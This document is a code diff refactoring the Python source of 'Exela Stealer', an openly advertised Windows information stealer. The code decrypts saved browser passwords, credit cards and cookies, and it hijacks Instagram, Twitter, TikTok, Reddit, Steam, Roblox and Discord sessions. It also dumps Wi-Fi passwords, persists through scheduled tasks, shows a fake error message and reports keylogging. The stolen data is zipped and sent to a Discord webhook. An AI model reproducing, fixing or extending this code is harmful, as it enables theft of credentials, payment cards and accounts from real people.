@@ -14,9 +14,11 @@ inject_discord = bool('%Injection%')
 FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))  
 
 def create_mutex(mutex_value) -> bool:
-    kernel32 = ctypes.windll.kernel32 #kernel32.dll 
-    mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutext
-    return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
+    try:
+        kernel32 = ctypes.windll.kernel32 #kernel32.dll 
+        mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutex
+        return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
+    except: return True
 
 class SubModules:
     @staticmethod
@@ -84,37 +86,24 @@ class QuicaxdExela:
         self.mozilla_profiles_full_path = list()
         self.login_data_path = ""
         self.backup_login_data_path = os.environ["temp"] + "\\login_data_copy.db"
-        self.passw = []
-        self.cookeds = []
-        self.ottomonCC = []
-        self.sexDonwloads = []
-        self.sexHistorys = []
-        self.mozilla_history = []
-        self.mozilla_cookie = []
-        self.passws = 0
-        self.cc = 0
-        self.cookie = 0
-        self.downloads = 0
-        self.historys = 0       
-        self.insta = False
-        self.twitter = False
-        self.tiktok = False
-        self.reddit = False
-        self.steam = False
-        self.roblox = False
-        self.growtopia = False
-        self.discrod = False
-        self.dcToken = []
+        self.passwords_list = list()
+        self.cookie_list = list()
+        self.card_list = list()
+        self.downloads_list = list()
+        self.history_list = list()
+        self.mozilla_history = list()
+        self.mozilla_cookie =list()      
+        self.dcToken = list()
         self.fullTokens = list()
         self.validatedTokens = list()
-        self.discordd = []
-        self.instaa = []
-        self.twitterr = []
-        self.tiktokk = []
-        self.redditt = []
-        self.steamm = []
-        self.robloxx = []
-        self.growtopiaa = []     
+        self.discordd = list()
+        self.instagram_account_list = list()
+        self.twitter_account_list = list()
+        self.tiktok_account_list = list()
+        self.reddit_account_list = list()
+        self.steam_account_list = list()
+        self.roblox_account_list = list()
+        self.growtopia_account_list = list()     
         if not startup_xd == "no-startup":
             self.copyToStartup()   
         self.doitEveryProfile()
@@ -141,13 +130,13 @@ class QuicaxdExela:
         }
         for _,path in full_browsers.items():
             for f in profiles:
-                 self.connect_to_database(path, f, "Local")
-                 self.connect_to_database2(path, f, "Local") 
-                 self.connect_to_database3(path, f, "Local")
-                 self.connect_to_database4(path, f, "Local")
-                 self.connect_to_database5(path, f, "Local")
+                 self.connect_to_database(path, f)
+                 self.connect_to_database2(path, f) 
+                 self.connect_to_database3(path, f)
+                 self.connect_to_database4(path, f)
+                 self.connect_to_database5(path, f)
 
-    def connect_to_database(self, value, value2, asd):
+    def connect_to_database(self, value, value2):
         try:
             path = f"{value}\\{value2}" + "\\Login Data"
             profPath = f"{value}\\{value2}"
@@ -176,18 +165,13 @@ class QuicaxdExela:
                 key = SubModules.GetKey(os.path.join(value, "Local State"))
                 for login in logins:
                     if login[1] and login[2]:
-                        self.passws +=1
                         url = login[0]
                         username = login[1]
                         password = SubModules.Decrpytion(login[2], key)
-                        self.passw.append("URL : " + url )
-                        self.passw.append("Username : " + username )
-                        self.passw.append("Password : " + password )
-                        self.passw.append("Browser : " + profil_kismi)
-                        self.passw.append("=" * 50)
+                        self.passwords_list.append(f"URL: {url}\nUsername : {username}\nPasswords : {password}\nBrowser : {profil_kismi}\n==================================================\n")
         except:
             pass
-    def connect_to_database2(self, value, value2, asd):
+    def connect_to_database2(self, value, value2):
         try:
             path = f"{value}\\{value2}" + "\\Web Data"
             profPath = f"{value}\\{value2}"
@@ -209,17 +193,16 @@ class QuicaxdExela:
                 logins = cursor.fetchall()
                 conn.close()
                 os.remove(self.backup_login_data_path)
-                key = SubModules.GetKey(os.path.join(value, "Local State"))(value)
+                key = SubModules.GetKey(os.path.join(value, "Local State"))
                 for cc in logins:
                     if cc[0]:
-                        self.cc +=1
                         if cc[2] < 10:
                             month = "0"  + f"{cc[2]}"
                         else:month = cc[2]
-                        self.ottomonCC.append(str(SubModules.Decrpytion(cc[0], key)) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
+                        self.card_list.append(str(SubModules.Decrpytion(cc[0], key)) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
         except:
             pass
-    def connect_to_database3(self, value, value2, asd):
+    def connect_to_database3(self, value, value2):
         try:
             path = f"{value}\\{value2}" + "\\Network\\Cookies"
             profPath = f"{value}\\{value2}"
@@ -257,9 +240,8 @@ class QuicaxdExela:
                 key = SubModules.GetKey(os.path.join(value, "Local State"))
                 for cookie in logins:
                     if cookie[3]:
-                        self.cookie += 1
                         cooked = SubModules.Decrpytion(cookie[3],key)
-                        self.cookeds.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cooked}")
+                        self.cookie_list.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cooked}")
                         if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                             self.setInstaSession(cooked, profil_kismi)
                         if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
@@ -272,7 +254,7 @@ class QuicaxdExela:
                             self.setRoblox(cooked, profil_kismi)
         except:
             pass
-    def connect_to_database4(self, value, value2, asd):
+    def connect_to_database4(self, value, value2):
         try:
             path = f"{value}\\{value2}" + "\\History"
             profPath = f"{value}\\{value2}"
@@ -296,11 +278,10 @@ class QuicaxdExela:
                 os.remove(self.backup_login_data_path)
                 for dwnlds in logins:
                     if dwnlds[0] or dwnlds[1]:
-                        self.downloads += 1
-                        self.sexDonwloads.append(f"{dwnlds[0]} : {dwnlds[1]}")
+                        self.downloads_list.append(f"{dwnlds[0]} : {dwnlds[1]}")
         except:
             pass
-    def connect_to_database5(self, value, value2, asd):
+    def connect_to_database5(self, value, value2):
         try:
             path = f"{value}\\{value2}" + "\\History"
             profPath = f"{value}\\{value2}"
@@ -324,8 +305,7 @@ class QuicaxdExela:
                 os.remove(self.backup_login_data_path)
                 for hstrys in logins:
                     if hstrys[0] or hstrys[1]:
-                        self.historys +=1
-                        self.sexHistorys.append(f"ID : {hstrys[0]} | URL : {hstrys[1]} | Title : {hstrys[2]} | Visit Count : {hstrys[3]} | Last Visit Time {hstrys[4]}")
+                        self.history_list.append(f"ID : {hstrys[0]} | URL : {hstrys[1]} | Title : {hstrys[2]} | Visit Count : {hstrys[3]} | Last Visit Time {hstrys[4]}")
         except:
             pass
     def GetMozillaProfiles(self):
@@ -346,7 +326,6 @@ class QuicaxdExela:
                     conn = sqlite3.connect(history_path)
                     cursor = conn.cursor()
                     for cookie in cursor.execute("SELECT host,name, path, value, expiry FROM moz_cookies").fetchall():
-                        self.cookie+=1
                         self.mozilla_cookie.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}")
                         if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                             self.setInstaSession(cookie[3], "Firefox")
@@ -370,7 +349,6 @@ class QuicaxdExela:
                     conn = sqlite3.connect(history_path)
                     cursor = conn.cursor()
                     for row in cursor.execute("SELECT id, url, title, visit_count, last_visit_date FROM moz_places;").fetchall():
-                        self.historys+=1
                         self.mozilla_history.append(f"ID : {row[0]} | URL : {row[1]} | Title : {row[2]} | Visit Count : {row[3]} | Last Visit Time {row[4]}")
                 except:
                     pass
@@ -401,7 +379,7 @@ class QuicaxdExela:
             verify = data["user"]["is_verified"]
             followers = data2["user"]["follower_count"]
             following = data2["user"]["following_count"]
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Instagram Session was detected on the{value} Browser***", color=0x070707, url="https://github.com/quicaxd",timestamp = "now")
+            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Instagram Session was detected on the{value} Browser***", color=0x070707, url="https://t.me/ExelaStealer",timestamp = "now")
             embed.set_thumbnail(url=pp)
             embed.add_field(name="Instagram Cookie", inline=True, value=f"```{sessionid}```")
             embed.add_field(name="Profile URL", inline=False, value=f"```{profileURL}```")
@@ -414,8 +392,7 @@ class QuicaxdExela:
             embed.add_field(name="Biography", inline=False, value=f"```{bio}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)  
-            self.insta = True
-            self.instaa.append(f"Instagram Cookie : {sessionid}\nProfile URL : {profileURL}\nUser Name : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nBiography : {bio}\n==========================================================================")
+            self.instagram_account_list.append(f"Instagram Cookie : {sessionid}\nProfile URL : {profileURL}\nUser Name : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nBiography : {bio}\n==========================================================================")
         except:
             pass
     def setTwitterSession(self, cookie, value):
@@ -431,7 +408,7 @@ class QuicaxdExela:
             'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42'}
             url = "https://twitter.com/i/api/1.1/account/update_profile.json"
             req = requests.post(url, headers=header, cookies={'auth_token': authToken}).json()
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Twitter Session was detected on the {value} browser***", color=0x070707, url="https://github.com/quicaxd",timestamp = "now")
+            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Twitter Session was detected on the {value} browser***", color=0x070707, url="https://t.me/ExelaStealer",timestamp = "now")
             try:
                 if req["description"] == "":
                     description == "There is no bio"
@@ -456,8 +433,7 @@ class QuicaxdExela:
             embed.add_field(name="Is Verified", inline=True, value=f"```{req['verified']}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
-            self.twitter = True
-            self.twitterr.append(f"Twitter Cookie : {cookie}\nProfile URL : {profileURL}\nUser Name : {username}\nScreen Name : {nickname}\nBiography : {description}\nFollower Count : {req['followers_count']}\nFollowing Count : {req['friends_count']}\nTotal Tweets : {req['statuses_count']}\nCreated At : {req['created_at']}\nIs Verified : {req['verified']}\n==========================================================================")                                        
+            self.twitter_account_list.append(f"Twitter Cookie : {cookie}\nProfile URL : {profileURL}\nUser Name : {username}\nScreen Name : {nickname}\nBiography : {description}\nFollower Count : {req['followers_count']}\nFollowing Count : {req['friends_count']}\nTotal Tweets : {req['statuses_count']}\nCreated At : {req['created_at']}\nIs Verified : {req['verified']}\n==========================================================================")                                        
         except:
             pass
     def setTiktokSession(self, cookie, value):
@@ -481,7 +457,7 @@ class QuicaxdExela:
                 phone = data["data"]["mobile"]
             useranme = data["data"]["username"]
             coins = data2["data"]["coins"]
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Tiktok Session was detected on the{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
+            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Tiktok Session was detected on the{value} browser***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
             embed.set_thumbnail(url="https://i.hizliresim.com/eai9bwi.jpg")
             embed.add_field(name="Tiktok Cookie", inline=True, value=f"```{cookies}```")
             embed.add_field(name="User identifier", inline=False, value=f"```{user_id}```")
@@ -492,8 +468,7 @@ class QuicaxdExela:
             embed.add_field(name="Coins", inline=True, value=f"```{coins}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
-            self.tiktok = True
-            self.tiktokk.append(f"Tiktok Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{useranme}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n==========================================================================")
+            self.tiktok_account_list.append(f"Tiktok Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{useranme}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n==========================================================================")
         except:
             pass
     def setRedditSession(self, cookie, value):
@@ -523,7 +498,7 @@ class QuicaxdExela:
             mod = data2["is_mod"]
             gold = data2["is_gold"]
             suspended = data2["is_suspended"]
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Reddit Session was detected on the{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
+            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Reddit Session was detected on the{value} browser***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
             embed.set_thumbnail(url=pp)
             embed.add_field(name="Reddit Cookie", inline=True, value=f"```{cookies}```")
             embed.add_field(name="Profile URL", inline=False, value=f"```{profileUrl}```")
@@ -537,8 +512,7 @@ class QuicaxdExela:
             embed.add_field(name="Suspended", inline=True, value=f"```{suspended}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
-            self.reddit = True
-            self.redditt.append(f"Reddit Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma: {commentKarma}\nTotal Karma : {totalKarma}\nCoins : {coins}\nIs Mod : {mod}\nIs Gold : {gold}\nSuspended : {suspended}\n==========================================================================")
+            self.reddit_account_list.append(f"Reddit Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma: {commentKarma}\nTotal Karma : {totalKarma}\nCoins : {coins}\nIs Mod : {mod}\nIs Gold : {gold}\nSuspended : {suspended}\n==========================================================================")
         except:
             pass
     def setSteam(self):
@@ -559,8 +533,7 @@ class QuicaxdExela:
                     profileURL = dataa["profileurl"]
                     displayName = dataa["personaname"]
                     timecreated = dataa["timecreated"]
-                    embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Steam Session Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
-
+                    embed = dhooks.Embed(title="***Exela Stealer***", description="***Exela Steam Session Detected***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
                     embed.set_thumbnail(url=pp)
                     embed.add_field(name="Steam Identifier", inline=False, value=f"```{idf}```")
                     embed.add_field(name="Profile URL",  inline=False,value=f"```{profileURL}```")
@@ -569,8 +542,7 @@ class QuicaxdExela:
                     embed.add_field(name="Player Level", inline=True, value=f"```{data2}```")
                     embed.set_footer(text="https://t.me/ExelaStealer")
                     self.hook.send(embed=embed)
-                    self.steam = True
-                    self.steamm.append(f"Steam Identifier : {idf}\nProfile URL : {profileURL}\nProfil Name : {displayName}\nTime Created : {timecreated}\nPlayer Level : {data2}\n==========================================================================")
+                    self.steam_account_list.append(f"Steam Identifier : {idf}\nProfile URL : {profileURL}\nProfil Name : {displayName}\nTime Created : {timecreated}\nPlayer Level : {data2}\n==========================================================================")
         except Exception as e:
             print(str(e))
         else:
@@ -590,7 +562,7 @@ class QuicaxdExela:
             robux = requests.get(url, headers=headers).json()["robux"]
             url2 = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" + str(accinfo['UserId']) + "&size=420x420&format=Png&isCircular=false"
             picUrl = requests.get(url2, headers=headers).json()["data"][0]["imageUrl"]
-            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Roblox Session was Detected on{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
+            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Roblox Session was Detected on{value} browser***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
             embed.set_thumbnail(url=picUrl)
             embed.add_field(name="Roblox Cookie", inline=False, value=f"```{robuxCookie}```")
             embed.add_field(name="Profile URL", inline=False, value=f"```{picUrl}```")
@@ -600,8 +572,7 @@ class QuicaxdExela:
             embed.add_field(name="Email Verified", inline=False, value=f"```{accinfo['IsEmailVerified']}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
-            self.roblox = True
-            self.robloxx.append(f"Steam Cookie : {robuxCookie}\nProfile URL : {picUrl}\nTotal Robux : {robux}\nName : {accinfo['Name']}\nEmail : {email}\nEmail Verified : {accinfo['Name']}\n==========================================================================")
+            self.robloxx.append(f"Roblox Cookie : {robuxCookie}\nProfile URL : {picUrl}\nTotal Robux : {robux}\nName : {accinfo['Name']}\nEmail : {email}\nEmail Verified : {accinfo['Name']}\n==========================================================================")
         except:
             pass
     def setSpotfiy(self):
@@ -679,7 +650,7 @@ class QuicaxdExela:
                     if requests.get(dcpp + ".png").status_code == 200:
                         dcpp += ".png"
                     else:dcpp += ".gif"
-                    embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected on {browserorname}***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
+                    embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Discord Token Detected on {browserorname}***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
                     embed.set_thumbnail(url=dcpp)
                     embed.add_field(name="ID",inline=True, value=f"```{id}```")
                     embed.add_field(name="Username",inline=True, value=f"```{req.json()['username']}```")
@@ -739,7 +710,7 @@ class QuicaxdExela:
                 subprocess.run(code, shell=True)
         elif startup_xd == "schtasks":
             result = subprocess.run(
-                'schtasks /query /TN "AutoUpdateChecker"',
+                'schtasks /query /TN "AutoUpdateCheckerHourly"',
                 shell=True,
                 stdout=subprocess.PIPE,  
                 stderr=subprocess.PIPE )
@@ -754,62 +725,37 @@ class QuicaxdExela:
                     if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                         os._exit(0)
                     else: # if not give admin code
-                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /tn "AutoUpdateCheckerHourly2" /tr "{os.path.join(os.getenv("localappdata"), "ExelaUpdateService", "Exela.exe")}"'
+                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /tn "AutoUpdateCheckerHourly" /tr "{os.path.join(os.getenv("localappdata"), "ExelaUpdateService", "Exela.exe")}"'
                         subprocess.run(everyOneHour, shell=True)
     def sendxd(self):
         global hooksxd
-        instagram = ""
-        twitter = ""
-        tiktok = ""
-        reddit = ""
-        steamm = ""
-        discords = ""
-        roblox = ""
-        if self.insta: instagram = "Yes"
-        else:instagram = "Nope"
-        if self.twitter:twitter = "Yes"
-        else:twitter = "Nope"
-        if self.tiktok:tiktok = "Yes"
-        else:tiktok="Nope"
-        if self.reddit:reddit="Yes"
-        else:reddit="Nope"
-        if self.discrod: discords = "Yes"
-        else:discords = "Nope"
-        if self.steam: steamm="Yes"
-        else: steamm="Nope"
-        if self.roblox: roblox = "Yes"
-        else:roblox = "Nope"
         command = "wmic csproduct get uuid"
         run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
         shutil.make_archive(os.getenv('temp') + f"\\{run}", "zip", os.getenv('temp') + f"\\{run}")
         hooksxdd = dhooks.Webhook(UrLxD,username="i fucked her (quicaxd <3)")
         filee = dhooks.File(os.getenv('temp') + f"\\{run}.zip")
-        embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Stealer***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
+        embed = dhooks.Embed(title="***Exela Stealer***", description="***Exela Stealer***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
         embed.set_thumbnail(url="https://i.hizliresim.com/8po0puy.jfif")
-        embed.add_field(name="Found Instagram Session's",  inline=True,value=f"```{instagram}```")
-        embed.add_field(name="Found Twitter Session's",  inline=True,value=f"```{twitter}```")
-        embed.add_field(name="Found Tiktok Session's",  inline=True,value=f"```{tiktok}```")
-        embed.add_field(name="Found Reddit Session's",  inline=True,value=f"```{reddit}```")
-        embed.add_field(name="Found Discord Token's",  inline=True,value=f"```{discords}```")
-        embed.add_field(name="Found Steam Session's",  inline=True,value=f"```{steamm}```")
-        embed.add_field(name="Found Roblox Session's",  inline=True,value=f"```{roblox}```")
-        embed.add_field(name="Total Password's",  inline=True,value=f"```{self.passws}```")
-        embed.add_field(name="Total Card's",  inline=True,value=f"```{self.cc}```")
-        embed.add_field(name="Total Cookies",  inline=True,value=f"```{self.cookie}```")
-        embed.add_field(name="Total Download's",  inline=True,value=f"```{self.downloads}```")
-        embed.add_field(name="Total History's",  inline=True,value=f"```{self.historys}```")
-        if injectKeylogger:
-            embed.add_field(name="Inject Keylogger?", inline=True, value="```Yes, Keylogger logs will come after every 300 keystrokes```")
-        else:
-            embed.add_field(name="Inject Keylogger?", inline=True, value="```Nope```")
-        embed.add_field(name="Exela Stealer is the best", inline=False, value=f"```{'just sex and money xd'}```")
+        embed.add_field(name="Found Instagram Session's",  inline=True,value=f"```{str(len(self.instagram_account_list)) if self.instagram_account_list else 'Nope'}```")
+        embed.add_field(name="Found Twitter Session's",  inline=True,value=f"```{str(len(self.twitter_account_list)) if self.twitter_account_list else 'Nope'}```")
+        embed.add_field(name="Found Tiktok Session's",  inline=True,value=f"```{str(len(self.tiktok_account_list)) if self.tiktok_account_list else 'Nope'}```")
+        embed.add_field(name="Found Reddit Session's",  inline=True,value=f"```{str(len(self.reddit_account_list)) if self.reddit_account_list else 'Nope'}```")
+        embed.add_field(name="Found Discord Token's",  inline=True,value=f"```{str(len(self.validatedTokens)) if self.validatedTokens else 'Nope'}```")
+        embed.add_field(name="Found Steam Session's",  inline=True,value=f"```{str(len(self.steam_account_list)) if self.steam_account_list else 'Nope'}```")
+        embed.add_field(name="Found Roblox Session's",  inline=True,value=f"```{str(len(self.roblox_account_list)) if self.roblox_account_list else 'Nope'}```")
+        embed.add_field(name="Total Password's",  inline=True,value=f"```{str(len(self.passwords_list))}```")
+        embed.add_field(name="Total Card's",  inline=True,value=f"```{str(len(self.card_list))}```")
+        embed.add_field(name="Total Cookies",  inline=True,value=f"```{str(len(self.cookie_list) + len(self.mozilla_cookie))}```")
+        embed.add_field(name="Total Download's",  inline=True,value=f"```{str(len(self.downloads_list))}```")
+        embed.add_field(name="Total History's",  inline=True,value=f"```{str(len(self.history_list) + len(self.mozilla_history))}```")
+        embed.add_field(name="Inject Keylogger?", inline=True, value=f"```{'Yes, Keylogger logs will come after every 300 keystrokes' if injectKeylogger else 'Nope'}```")
+        embed.add_field(name="Exela Stealer is the best", inline=False, value="```just sex and money xd```")
         embed.set_footer(text="https://t.me/ExelaStealer")
         hooksxdd.send(embed=embed, file=filee)
-        os.remove(os.getenv('temp') + f"\\{run}.zip")
-        shutil.rmtree(os.getenv('temp') + f"\\{run}")
-    def writeToText(self, path, data):
-        with open(path, "a", encoding="utf-8", errors="ignore") as f:
-            f.write(str(data) + "\n")
+        try:
+            os.remove(os.getenv('temp') + f"\\{run}.zip")
+            shutil.rmtree(os.getenv('temp') + f"\\{run}")
+        except:pass
     def get_active_window_title(self):
         try:
             user32 = ctypes.windll.user32
@@ -876,9 +822,9 @@ class QuicaxdExela:
                 except:password_match = re.search(r'Key content\s*: (.*)', result.decode(errors="ignore"), re.IGNORECASE)
                 wifi_list.append((profile_name, password_match.group(1) if password_match else "No password found"))
             with open(pathxd,"a", encoding="utf-8", errors="ignore") as file:
-                file.write("https://t.me/ExelaStealer\n===========================================")
+                file.write("----------------------https://t.me/ExelaStealer----------------------\n\n")
                 for name, passw in wifi_list:
-                    file.write(f"\nWifi Profile : {name}\nWifi Password : {passw}\n===========================================")
+                    file.write(f"\nWifi Profile: {name}\nWifi Password: {passw}\n===========================================")
         except Exception as asd:
             print(str(asd))
     def writeAllData(self):    
@@ -890,35 +836,35 @@ class QuicaxdExela:
         shutil.rmtree(tmp+f'\\{run}')
         print("Deleted Temp Folder!, creating new folder") 
         os.mkdir(tmp + f"\\{run}")
-        if not self.passws == 0:
+        if self.passwords_list:
             os.mkdir(tmp + f"\\{run}\\Passwords")
             with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
                 f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                for passwss in self.passw:
+                for passwss in self.passwords_list:
                     f.write(str(passwss) + "\n")
-        if not self.cc == 0:
+        if self.card_list:
             os.mkdir(tmp + f"\\{run}\\Cards")
             with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
                 x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for uknowwhatiscc in self.ottomonCC:
+                for uknowwhatiscc in self.card_list:
                     x.write(str(uknowwhatiscc) + "\n")
-        if not self.cookie == 0:
+        if self.cookie_list:
             os.mkdir(tmp + f"\\{run}\\Cookies")
             with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
                 c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for allCookies in self.cookeds:
+                for allCookies in self.cookie_list:
                     c.write(str(allCookies) + "\n")
-        if not self.downloads == 0:
+        if self.downloads_list:
             os.mkdir(tmp + f"\\{run}\\Downloads")
             with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
                 d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                for dwnlds in self.sexDonwloads:
+                for dwnlds in self.downloads_list:
                     d.write(str(dwnlds) + "\n")
-        if not self.historys == 0:
+        if self.history_list:
             os.mkdir(tmp + f"\\{run}\\Historys")
             with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for date in self.sexHistorys:
+                for date in self.history_list:
                     q.write(str(date) + "\n")
         if self.mozilla_history:
             try:
@@ -938,29 +884,29 @@ class QuicaxdExela:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                 for date in self.mozilla_cookie:
                     q.write(str(date) + "\n")
-        if not self.insta == 0:
+        if self.instagram_account_list:
             os.mkdir(tmp + f"\\{run}\\Instagram")
             with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for ii in self.instaa:
+                for ii in self.instagram_account_list:
                     q.write(str(ii) + "\n")
-        if not self.twitter == 0:
+        if self.twitter_account_list:
             os.mkdir(tmp + f"\\{run}\\Twitter")
             with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for tt in self.twitterr:
+                for tt in self.twitter_account_list:
                     q.write(str(tt) + "\n")
-        if not self.tiktok == 0:
+        if self.tiktok_account_list:
             os.mkdir(tmp + f"\\{run}\\Tiktok")
             with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for ti in self.tiktokk:
+                for ti in self.tiktok_account_list:
                     q.write(str(ti) + "\n")
-        if not self.reddit == 0:
+        if self.reddit_account_list:
             os.mkdir(tmp + f"\\{run}\\Reddit")
             with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for re in self.redditt:
+                for re in self.reddit_account_list:
                     q.write(str(re) + "\n")
         if self.fullTokens:
             os.mkdir(tmp + f"\\{run}\\Tokens")
@@ -978,25 +924,18 @@ class QuicaxdExela:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                 for re in self.discordd:
                     q.write(str(re) + "\n")
-
-        if self.steam:
+        if self.steam_account_list:
             os.mkdir(tmp + f"\\{run}\\Steam")
             with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for st in self.steamm:
+                for st in self.steam_account_list:
                     q.write(str(st) + "\n")
-        if self.roblox==True:
+        if self.roblox_account_list:
             os.mkdir(tmp + f"\\{run}\\Roblox")
             with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
                 q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for robl in self.robloxx:
+                for robl in self.roblox_account_list:
                     q.write(str(robl))
-        if not self.growtopia == 0:
-            os.mkdir(tmp + f"\\{run}\\Growtopia")
-            with open(tmp + f"\\{run}\\Growtopia\\Growtopia.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for gw in self.growtopiaa:
-                    q.write(str(gw) + "\n")
         if 5 < 10:
